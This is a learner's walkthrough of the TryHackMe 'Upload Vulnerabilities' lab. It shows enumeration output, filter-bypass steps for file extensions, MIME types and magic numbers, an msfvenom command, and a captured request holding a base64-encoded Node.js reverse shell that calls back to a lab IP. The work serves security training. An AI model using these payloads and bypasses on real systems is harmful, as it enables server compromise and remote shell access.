# TRYHACKME : Upload Vulnerabilities
My own nooby way of learning and approaching this room.

<details>

<summary><h2>GETTING STARTED</h2></summary>

Start the machine!

We will need to do a little configuration in our host file to continue this activity.

First access the **host file**:
> - On Linux and MacOS the hosts file can be found at `/etc/hosts`.
> - On Windows the hosts file can be found at `C:\Windows\System32\drivers\etc\hosts`.
> 
> On Linux or MacOS you will need to use sudo to open the file for writing. In Windows you will need to open the file with "Run as Administrator".

As a linux user, I'll show you what I did:
```
$ sudo vim /etc/hosts

// THEN ADDED THIS TO THE END OF THE FILE
<TARGET-IP>    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm
```
> Note: If you have done this step before then you must remove the previous entry. There should only ever be one line in the file that contains the above URLs.

Now let's get started!

</details>

<details>
  
<summary><h2>INTRODUCTION</h2></summary>

> Improperly managed file uploads can create significant vulnerabilities in a server, potentially leading to severe issues like Remote Code Execution (RCE) and unauthorized content alteration. Attackers with unrestricted upload access can exploit these vulnerabilities to inject malicious content, host illegal material, or leak sensitive information, making unrestricted file uploads a serious security risk.
>
> - Overwriting existing files on a server
> - Uploading and Executing Shells on a server
> - Bypassing Client-Side filtering
> - Bypassing various kinds of Server-Side filtering
> - Fooling content type validation checks

</details>

<details>

<summary><h2>GENERAL METHODOLOGY</h2></summary>

We'll first start with enumeration.

> Tools we could use:
> - Gobuster
> - Burpsuite
> - Wappalyser
> - OWASP Zap

### NMAP 
Imma give a quick nmap scan, maybe it could give us a general info about our target ip:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ed:a5:d8:f8:6b:a1:7c:c5:5b:df:64:28:c1:57:25:c3 (RSA)
|   256 dd:eb:83:a2:02:fc:b2:8b:39:f9:0b:14:bd:6f:60:cd (ECDSA)
|_  256 fb:3f:5b:00:89:ee:18:25:ea:a3:fd:59:d6:98:59:6d (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: File Overwrite
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Accessing the IP in port 80
It only shows a plain html page with these texts:
```
Please read the instructions in task one. You must access this server with one of the following virtual hosts:

    overwrite.uploadvulns.thm
    shell.uploadvulns.thm
    java.uploadvulns.thm
    annex.uploadvulns.thm
    magic.uploadvulns.thm
    jewel.uploadvulns.thm

Refer to the instructions in task one for more information
```
We might be using these domain names later.

</details>

<h1>DIFFERENT ATTACKS:</h1>

<details>
  
<summary><h2>ATTACK: OVERWRITING EXISTING FILES</h2></summary>

> According to THM, to prevent overwriting existing files on the server, it is essential to perform checks during file uploads and commonly assign new names to the files, often incorporating random elements or timestamps.
>
> Take note also of file permissions. Web pages or files in the server should not be writeable to the web user, to prevent them from being overwritten with a malicious version uploaded by an attacker.

Open browser and access this site `http://overwrite.uploadvulns.thm/`

We are met with a `select file` and `upload` buttons.

Let's inspect the source code. The img gave us a clue of the directory the bg img came from.
```
<img src="images/mountains.jpg" alt="">
```

Imma choose some image we can use to replace the background, and rename it as `mountains.jpg`. 

Then upload it.

Retrieve your flag after.

</details>

<details>

<summary><h2>ATTACK: REMOTE CODE EXECUTION</h2></summary>

> Remote code execution through an upload vulnerability in a web application is often exploited by uploading a program written in the same language as the website's back-end or another language that the server can execute.
>
> In routed applications, where routes are defined programmatically rather than mapped to the file system, the likelihood of this type of attack occurring is significantly reduced due to increased complexity.
>
> [1] Realistically a fully featured reverse/bind shell is the ideal goal for an attacker.
>
> [2] While a webshell may be the only option available (for example, if a file length limit has been imposed on uploads, or if firewall rules prevent any network-based shells)
>
> The general approach involves uploading a shell and activating it either by directly accessing the file on non-routed applications with weak restrictions or by compelling the web application to execute the script in routed applications.

Let's navigate to `http://shell.uploadvulns.thm/`.

We are met again with another upload option.

Let's first start a directory enumeration with gobuster.

### Gobuster
```
$ gobuster dir -u http://shell.uploadvulns.thm/ -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shell.uploadvulns.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 286]
/.htaccess            (Status: 403) [Size: 286]
/assets               (Status: 301) [Size: 331] [--> http://shell.uploadvulns.thm/assets/]                                                  
/favicon.ico          (Status: 200) [Size: 1742]
/resources            (Status: 301) [Size: 334] [--> http://shell.uploadvulns.thm/resources/]                                               
/server-status        (Status: 403) [Size: 286]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

### Webshell
I opt to use webshell for this one. If instead you want to try another approach, you can opt for reverse shell.

I will be using an existing webshell found in kali machine. Just get a copy of `php-reverse-shell.php` from `/usr/share/webshells/php` and rename it.

Modify the `$ip` to be your tun0 IP or VPN IP and `$port` as your chosen port.

Start a netcat listener and upload the webshell php file.

Then retrieve your flag from /var/www/.

</details>

<details>
  
<summary><h2>DEFENSE: FILTERING</h2></summary>

> Client-side filtering occurs in the user's browser before a file is uploaded to the server, making it easy to bypass and thus insecure for verifying uploaded files. In contrast, server-side filtering runs on the server and is more difficult to circumvent, as the code is not accessible to the user, requiring attackers to craft payloads that conform to the existing filters while still executing their code. Overall, **server-side filtering is a more reliable method for ensuring the security of file uploads.**
> 
> **Different types of Filtering:**
> - EXTENSION VALIDATION
>> File extensions are intended to indicate a file's contents, but they can be easily changed, making them unreliable; while Windows uses them to identify file types, Unix-based systems employ different methods. Filters for file uploads typically operate by either **blacklisting** disallowed extensions or **whitelisting** permitted ones.
> - FILE TYPE FILTERING
>> More intensive than extension validation.
>> 1. MIME VALIDATION = still easy to bypass due to reliance to extension
>> 2. MAGIC NUMBER VALIDATION = accurate way of determining the contents of a file
> - FILE LENGTH FILTERING
>> File length filters are implemented to prevent excessively large files from being uploaded, which can deplete server resources; however, if an upload form has a small file size limit, it may restrict the upload of certain payloads, such as a PHP reverse shell that exceeds the allowed size.
> - FILE NAME FILTERING
>> Uploaded files should have unique names to prevent overwriting existing files, typically achieved by adding randomness or checking for name conflicts, while also sanitizing filenames to eliminate potentially harmful characters. Consequently, on a well-managed system, the original name of an uploaded file may not be preserved, necessitating a search for the file if content filtering is bypassed.
> - FILE CONTENT FILTERING
>> More advanced filtering systems may analyze the entire contents of an uploaded file to verify that it is not misrepresenting its extension, MIME type, or Magic Number, but this complex process is beyond the scope of this room.

> From THM:
> 
> _It's worth noting that none of these filters are perfect by themselves -- they will usually be used in conjunction with each other, providing a multi-layered filter, thus increasing the security of the upload significantly. Any of these filters can all be applied client-side, server-side, or both._
>
> _Similarly, different frameworks and languages come with their own inherent methods of filtering and validating uploaded files. As a result, it is possible for language specific exploits to appear; for example, until PHP major version five, it was possible to bypass an extension filter by appending a null byte, followed by a valid extension, to the malicious .php file. More recently it was also possible to inject PHP code into the exif data of an otherwise valid image file, then force the server to execute it. These are things that you are welcome to research further, should you be interested._

</details>

<details>

<summary><h2>ATTACK: BYPASSING CLIENT-SIDE FILTERNING</h2></summary>

> This is the first and weakest line of defense.
>
> 4 Ways to Bypass:
>> 1. Turn off Javascript in your browser => works in site not requiring javacript for basic functionalities 
>> 2. Intercept and modify incoming page => use burpsuite then strip out the javascript filter
>> 3. Intercept and modify the file upload => works after the webpage loaded, and passed or accepted by the filter
>> 4. Send the file directly to the upload point => sending file directly with `curl`. example syntax for such a command would look something like this: `curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>`. To use this method you would first aim to intercept a successful upload (using Burpsuite or the browser console) to see the parameters being used in the upload, which can then be slotted into the above command.
>
> Let's now put this in practice.
> 
>> Navigate to `http://java.uploadvulns.thm/`.
>>
>> As we inspect the source code, it seems to contain an external javascript instead of it being in the main page.
>>
>> We can't view the MIME filter, but we will with Burpsuite. (You can also check the js source code instead by navigating to the /assets/ directory)
>>
>> Prepare the webshell php file earlier. Get another duplicate copy and change the file extension into `.jpg`.
>>
>> When I tried to select it for upload, it rejects it. The `.jpg` file type is invalid.
>>
>> After numerous attemps of other rejected file extensions, I finally discovered that it accepts a `.png` extension.
>>
>> Now let's turn on our Burpsuite interception.
>>
>> Click `forward` and catch the request.
>>
>> In advance, start a netcat listener before we finally forward the modified request.
>>
>> Now change the filename extention from `.png` into `.php`. Also change the "Content-type" from `image/png` into `text/x-php`.
>>
>> After the modification, forward the request to the server.
>>
>> It will give a sucess status. Now let's go to the upload directory.
>>
>> Let's use gobuster since the upload directory seems to be in a different name.
>>
>> It's in the `/images/`.
>>
>> Now click on the file and receive the shell.
>>
>> Retrieve your flag from the `/var/www` directory

</details>

<details>

<summary><h2>ATTACK: BYPASSING SERVER-SIDE FILTERNING = FILE EXTENSION</h2></summary>

> In server-side filter, we will need to do a lot of testing to know what is allowed and disallowed of the filters.
>
> Then we will gradually create a payload that conforms to the restriction.
>
> For example, let's say the server's php code filter has `.php` and `.phtml` blacklisted. We can bypass this by using other extensions such as `.php3`, `.php4`, `.php5`, `.php7`, `.phps`, `.php-s`, `.pht`, and `.phar`
>
> However, the server could be configured to not recognise them as php file. (It's a default for Apache 2. Still worth trying if the server is outdated)
>
> We can also bypass this if the filter is only checking from the filename a specific extension that exist. For example, the filter is only lookng for `.jpg` and can accept files such as `shell.jpg.php`
>
>> This is the really important point to take away from this task: there are a million different ways to implement the same feature when it comes to programming -- your exploitation must be tailored to the filter at hand. The key to bypassing any kind of server side filter is to enumerate and see what is allowed, as well as what is blocked; then try to craft a payload which can pass the criteria the filter is looking for.
>
> Let's now put this to practice
>
>> Navigate the `http://annex.uploadvulns.thm/`.
>>
>> I uploaded a file with a `.png`, and it seems to accept this extension.
>> 
>> I tried uploading the webshell as `rshell.png.php`, but its invalid.
>>
>> Maybe we can try another version of php extension. Let's try `.phar`
>>
>> The extension is still invalid.
>>
>> After tediously trying other php version extensions, the `rshell.php5` was finally uploaded successfully!
>>
>> I performed gobuster while trying all combinations, leading us into `/privacy` directory.
>>
>> Now proceed to the directory, start netcat listener, and run the file.
>>
>> Retrieve your flag from `/var/www/`.
  
</details>


<details>

<summary><h2>ATTACK: BYPASSING SERVER-SIDE FILTERNING = MAGIC NUMBERS</h2></summary>

> Bear in mind that this technique can be very effective against a PHP based webserver; however, it can sometimes fail against other types of webserver (hint hint).
>
> You can check the list of file signatures from this [wikipage](https://en.wikipedia.org/wiki/List_of_file_signatures)
> 
>> Open `http://magic.uploadvulns.thm/`.
>>
>> When I tried to upload a file, it gives us a clue of only allowing `.gif` extension.
>>
>> Take note that the file signature or magic number of gif is `47 49 46 38 37 61` or `47 49 46 38 39 61`. It's text equivalent is `GIF87a` and `GIF89a`
>>
>> Let's add its text equivalent in the top of the file with the text editor of your choice.
>> 
>> When you run a `file rshell.php` command it will give a `rshell.php: GIF image data, version 87a, 15370 x 28735`. You can also use `hexeditor` to check the hex format of the file.
>>
>> We have successfully spoofed the magic number of gif.
>>
>> Now let's upload this and it give a successful upload status.
>>
>> Let's run gobuster for the upload directory. There is an interesting directory called '/graphics'
>>
>> Start your netcat listener in advance.
>>
>> We can't access the directory (forbidden) therefore we will access it directly through the URL. `http://magic.uploadvulns.thm/graphics/rshell.php`
>>
>> Retrieve your flag from `/var/www`
  
</details>


<details>

<summary><h2>EXAMPLE METHODOLOGY</h2></summary>

> A guided methodology for approaching the next black-box challenge room.
>
>> 1. The first thing we would do is take a look at the website as a whole. Using browser extensions such as the aforementioned Wappalyzer (or by hand) we would look for indicators of what languages and frameworks the web application might have been built with. Be aware that Wappalyzer is not always 100% accurate. A good start to enumerating this manually would be by making a request to the website and intercepting the response with Burpsuite. Headers such as server or x-powered-by can be used to gain information about the server. We would also be looking for vectors of attack, like, for example, an upload page. 
>> 2. Having found an upload page, we would then aim to inspect it further. Looking at the source code for client-side scripts to determine if there are any client-side filters to bypass would be a good thing to start with, as this is completely in our control.
>> 3. We would then attempt a completely innocent file upload. From here we would look to see how our file is accessed. In other words, can we access it directly in an uploads folder? Is it embedded in a page somewhere? What's the naming scheme of the website? This is where tools such as Gobuster might come in if the location is not immediately obvious. This step is extremely important as it not only improves our knowledge of the virtual landscape we're attacking, it also gives us a baseline "accepted" file which we can base further testing on.
>>    - An important Gobuster switch here is the -x switch, which can be used to look for files with specific extensions. For example, if you added -x php,txt,html to your Gobuster command, the tool would append .php, .txt, and .html to each word in the selected wordlist, one at a time. This can be very useful if you've managed to upload a payload and the server is changing the name of uploaded files.
>> 4. Having ascertained how and where our uploaded files can be accessed, we would then attempt a malicious file upload, bypassing any client-side filters we found in step two. We would expect our upload to be stopped by a server side filter, but the error message that it gives us can be extremely useful in determining our next steps.
>>
>> Assuming that our malicious file upload has been stopped by the server, here are some ways to ascertain what kind of server-side filter may be in place:
>>
>> - If you can successfully upload a file with a totally invalid file extension (e.g. testingimage.invalidfileextension) then the chances are that the server is using an extension blacklist to filter out executable files. If this upload fails then any extension filter will be operating on a whitelist.
>> - Try re-uploading your originally accepted innocent file, but this time change the magic number of the file to be something that you would expect to be filtered. If the upload fails then you know that the server is using a magic number based filter.
>> - As with the previous point, try to upload your innocent file, but intercept the request with Burpsuite and change the MIME type of the upload to something that you would expect to be filtered. If the upload fails then you know that the server is filtering based on MIME types.
>> - Enumerating file length filters is a case of uploading a small file, then uploading progressively bigger files until you hit the filter. At that point you'll know what the acceptable limit is. If you're very lucky then the error message of original upload may outright tell you what the size limit is. Be aware that a small file length limit may prevent you from uploading the reverse shell we've been using so far.
  
</details>


<details>

<summary><h2>CHALLENGE</h2></summary>

> For the anticipated exciting part, let's now navigate to `http://jewel.uploadvulns.thm/`.
>
> ## Enumeration
```
$ gobuster dir -u http://jewel.uploadvulns.thm/ -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://jewel.uploadvulns.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/ADMIN                (Status: 200) [Size: 1238]
/Admin                (Status: 200) [Size: 1238]
/Content              (Status: 301) [Size: 181] [--> /Content/]
/admin                (Status: 200) [Size: 1238]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/content              (Status: 301) [Size: 181] [--> /content/]
/modules              (Status: 301) [Size: 181] [--> /modules/]
/secci�               (Status: 400) [Size: 1092]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```
>
>> The webpage itself gave us a clue that it only accept an image type extension file.
>>
>> When selecting files, it only looks for JPEG Image type, so i guess this is the biggest giveaway to us. It seems to have a client-side filter going on.
>>
>> Let's try all the type of bypass techniques we learned.
>>
>> Let's do some basic enumeration of the webpage. We already have the directories from gobuster.
>>
>> Excluding `/admin`, these other directories are in a forbidden or not found status: `/assets`, `/contents`, `/modules`, or `/secci�`
>>
>> The `/admin` seems to only execute a file from the `/modules` directory.
>>
>> Inspecting the source code further, it seems that the background images came from the `/content` directory.
>>
>> According to Wappalyzer, the web framework is **Express** and programming language is **Node.js**. This means that `.php` files can't be executed here.
>>
>> We can use the payloads found from this [site](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#nodejs).
>>
>> We can also opt for `msfvenom -p nodejs/shell_reverse_tcp LHOST=tun0 LPORT=4455 -o shell.js`.
>>
>> For further enumeration, we can view the source code of the main page. Click the link for the other script, such as `view-source:http://jewel.uploadvulns.thm/assets/js/upload.js`. This one gave us more information about the ff. file filter requirements:
```
      //Check File Size
			if (event.target.result.length > 50 * 8 * 1024){
				setResponseMsg("File too big", "red");			
				return;
			}
			//Check Magic Number
			if (atob(event.target.result.split(",")[1]).slice(0,3) != "ÿØÿ"){      // FOR JPG: FF D8 FF DB
				setResponseMsg("Invalid file format", "red");
				return;	
			}
			//Check File Extension
			const extension = fileBox.name.split(".")[1].toLowerCase();
			if (extension != "jpg" && extension != "jpeg"){
				setResponseMsg("Invalid file format", "red");
				return;
			} 
```
>>
>
> ## Main Exploit
>>
>> We knew that the background images are found from the `/content` directory from the css source page.
>>
>> Let's run a quick gobuster for this directory, using the given txt from THM.
>>
>>These are all the `.jpg` files without any uploaded new ones:
```
/ABH.jpg              (Status: 200) [Size: 705442]
/FZB.jpg              (Status: 200) [Size: 154946]
/LKQ.jpg              (Status: 200) [Size: 444808]
/SAD.jpg              (Status: 200) [Size: 247159]
/UAD.jpg              (Status: 200) [Size: 342033]
/UXS.jpg              (Status: 200) [Size: 154946]
/XBK.jpg              (Status: 200) [Size: 154946]
/XXN.jpg              (Status: 200) [Size: 154946]
```
>>
>> We've tried to meet the ff. filter requirements such as the file size and file extension. The only issue was the magic number. This can be easilty spoofed throught the use of `hexeditor`.
>>
>> According to wikipedia, the file signature of jpg file is FF D8 FF DB. Edit the shell js file's magic number into this hex.
>>
>> Try `file shell.jpg` and it's result will become `shell.jpg: JPEG image data`.
>>
>> Now let's try uploading this. And it successfully uploads the file!
>>
>> Now let's try to find the new filename of this from the `/content` directory.
>>
>> Let's run gobuster to find out the new added file:
```
/ABH.jpg              (Status: 200) [Size: 705442]
/FZB.jpg              (Status: 200) [Size: 154946]
/LKQ.jpg              (Status: 200) [Size: 444808
/SAD.jpg              (Status: 200) [Size: 247159]
/UXS.jpg              (Status: 200) [Size: 154946]
/UAD.jpg              (Status: 200) [Size: 342033]
/XBK.jpg              (Status: 200) [Size: 154946]
/XXN.jpg              (Status: 200) [Size: 154946]
/ZZN.jpg              (Status: 200) [Size: 800]
```
>>
>> The noticed different file from all this jpg file is definitely `ZZN.jpg`.
>>
>> Now let's find a way to execute this file.
>>
>> If we remember we have the `/admin` directory from the root.
>>
>> We can try running this shell from this directory.
>>
>> Start a netcat listener in advance to capture shell.
>>
>> Then input `../content/ZZN.jpg` within the form.
>>
>> However, we are faced with a deadend, because the file seems to be unable to create a shell due to the added magic number from before.
>>
>> Let's find another way, and remove the magic number added with a text editor.
>>
>> Let's use burpsuite to capture the request of sending a legitimate jpg file.
>>
>> Put it on repeater and modify it as this code. Encode the file with base64.
>>
```
POST / HTTP/1.1
Host: jewel.uploadvulns.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 1157
Origin: http://jewel.uploadvulns.thm
Connection: keep-alive
Referer: http://jewel.uploadvulns.thm/

{"name":"shell2.js","type":"image/jpeg","file":"data:application/x-javascript;base64,KGZ1bmN0aW9uKCl7IHZhciByZXF1aXJlID0gZ2xvYmFsLnJlcXVpcmUgfHwgZ2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZDsgaWYgKCFyZXF1aXJlKSByZXR1cm47IHZhciBjbWQgPSAoZ2xvYmFsLnByb2Nlc3MucGxhdGZvcm0ubWF0Y2goL153aW4vaSkpID8gImNtZCIgOiAiL2Jpbi9zaCI7IHZhciBuZXQgPSByZXF1aXJlKCJuZXQiKSwgY3AgPSByZXF1aXJlKCJjaGlsZF9wcm9jZXNzIiksIHV0aWwgPSByZXF1aXJlKCJ1dGlsIiksIHNoID0gY3Auc3Bhd24oY21kLCBbXSk7IHZhciBjbGllbnQgPSB0aGlzOyB2YXIgY291bnRlcj0wOyBmdW5jdGlvbiBTdGFnZXJSZXBlYXQoKXsgY2xpZW50LnNvY2tldCA9IG5ldC5jb25uZWN0KDQ0NTUsICIxMC40LjEyNC44MCIsIGZ1bmN0aW9uKCkgeyBjbGllbnQuc29ja2V0LnBpcGUoc2guc3RkaW4pOyBpZiAodHlwZW9mIHV0aWwucHVtcCA9PT0gInVuZGVmaW5lZCIpIHsgc2guc3Rkb3V0LnBpcGUoY2xpZW50LnNvY2tldCk7IHNoLnN0ZGVyci5waXBlKGNsaWVudC5zb2NrZXQpOyB9IGVsc2UgeyB1dGlsLnB1bXAoc2guc3Rkb3V0LCBjbGllbnQuc29ja2V0KTsgdXRpbC5wdW1wKHNoLnN0ZGVyciwgY2xpZW50LnNvY2tldCk7IH0gfSk7IHNvY2tldC5vbigiZXJyb3IiLCBmdW5jdGlvbihlcnJvcikgeyBjb3VudGVyKys7IGlmKGNvdW50ZXI8PSAxMCl7IHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7IFN0YWdlclJlcGVhdCgpO30sIDUqMTAwMCk7IH0gZWxzZSBwcm9jZXNzLmV4aXQoKTsgfSk7IH0gU3RhZ2VyUmVwZWF0KCk7IH0pKCk7Cg=="
}
```
>>
>> We have now finally uploaded a shell. Let's now perform the last gobuster to determine the file name of the shell.
>>
>> Let's go back again to the `/admin` directory and run the filename from the `/content` directory.
>>
>> Retrieve your flag from the `/var/www`.

</details>
